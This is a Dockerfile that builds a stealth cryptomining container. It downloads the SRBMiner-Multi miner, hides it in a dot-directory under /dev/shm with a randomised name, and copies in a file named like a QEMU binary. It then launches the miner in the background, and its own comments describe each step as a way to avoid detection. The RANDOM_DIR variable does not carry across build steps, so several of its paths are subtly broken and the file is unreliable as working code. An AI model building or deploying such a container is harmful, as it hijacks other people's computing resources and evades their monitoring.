# Dockerfile
FROM ubuntu:focal

# Install dependencies
RUN apt-get update && apt-get -y install \
    wget curl coreutils inetutils-ping tar \
    && apt-get -y clean && rm -rf /var/lib/apt-get/lists/*

# Create a hidden directory in a less obvious location (e.g., /dev/shm or /tmp)
RUN mkdir -p /dev/shm/.sys-helper && cd /dev/shm/.sys-helper && \
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.2/SRBMiner-Multi-2-7-2-Linux.tar.gz && \
    tar -xf SRBMiner-Multi-2-7-2-Linux.tar.gz && \
    rm -rf SRBMiner-Multi-2-7-2-Linux.tar.gz

# Generate a random directory name to obscure the real nature of the files
RUN RANDOM_DIR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16) && \
    mv /dev/shm/.sys-helper/SRBMiner-Multi-2-7-2 /dev/shm/.sys-helper/$RANDOM_DIR

# Copy the entrypoint script and other necessary files with disguised names
COPY entrypoint /dev/shm/.sys-helper/$RANDOM_DIR/
COPY qemu-system-x86_64 /dev/shm/.sys-helper/$RANDOM_DIR/

# Change permissions for the entrypoint script
RUN chmod +x /dev/shm/.sys-helper/$RANDOM_DIR/entrypoint

# Use nohup or disown to run the process in the background and avoid detection
RUN echo './entrypoint > /dev/null 2>&1 & disown' > /dev/shm/.sys-helper/$RANDOM_DIR/start-helper.sh

# Make the script executable
RUN chmod +x /dev/shm/.sys-helper/$RANDOM_DIR/start-helper.sh

# Set the working directory to the hidden folder
WORKDIR "/dev/shm/.sys-helper/$RANDOM_DIR"

# Run the application in the background using nohup or disown to avoid detection in process list
ENTRYPOINT ["sh", "-c", "./start-helper.sh"]
